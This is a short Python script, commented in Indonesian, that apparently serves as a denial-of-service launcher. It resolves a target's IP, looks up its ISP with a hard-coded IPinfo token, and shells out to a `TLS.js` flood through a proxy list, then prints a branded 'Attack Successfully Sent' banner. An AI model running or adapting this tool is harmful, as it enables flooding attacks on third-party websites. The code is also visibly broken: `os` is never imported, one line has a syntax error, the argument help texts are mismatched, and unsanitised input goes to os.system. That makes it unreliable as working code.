import argparse
from datetime import datetime
import socket
import ipinfo

# Token API dari IPinfo
access_token = '40e69d29bf68ac'  # Ganti dengan token IPinfo Anda
handler = ipinfo.getHandler(access_token)

def clean_url(url):
    # Hapus protokol (http:// atau https://) dari URL jika ada
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    return url

def get_ip(domain):
    try:
        # Mendapatkan alamat IP dari domain
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return "Unable to get IP address"

def get_isp(ip_address):
    try:
        # Mendapatkan informasi ISP dari IPinfo
        details = handler.getDetails(ip_address)
        if 'org' in details.all:
            isp = details.org
            return isp
        else:
            return "ISP not found"
    except Exception as e:
        return f"Error: {e}"

def main(url, threads, time, methods):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M')

    # Bersihkan URL dari http:// atau https://
    cleaned_url = clean_url(url)

    # Mendapatkan IP address dari URL yang sudah dibersihkan
    ip_address = get_ip(cleaned_url)

    # Jika berhasil mendapatkan IP, maka lanjut ke pengecekan ISP
    if ip_address != "Unable to get IP address":
        isp_info = get_isp(ip_address)
    else:
        isp_info = "Unable to retrieve ISP information"

    print(f"   Target Details :")
    print(f"        \x1b[38;2;233;233;233mSTATUS  : [ \x1b[38;2;0;212;14mAttack Successfully Sent By iRazzGans \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{url} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mIP      : [ \x1b[38;2;0;255;255m{ip_address} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{threads} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{time} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255m{methods} \x1b[38;2;233;233;233m]")
    print(f"   Attack Details :")
    print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
    print(f"        \x1b[38;2;233;233;233mTELE   : [ \x1b[38;2;0;255;255mt.me/iRazzGans \x1b[38;2;233;233;233m]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simulate an attack command.')
    parser.add_argument('methods', type=str, help='URL to attack')
    parser.add_argument('url', type=str, help='Threads for attack')
    parser.add_argument('time', type=int, help='Time duration of attack')
    parser.add_argument('threads', type=str, help='Methods used')

    args = parser.parse_args()

    os.system(f'node TLS.js {args.url} {args.time} 5000 {args.threads} proxies.txt')

    main(args.methods} args.url, args.time, args.threads)
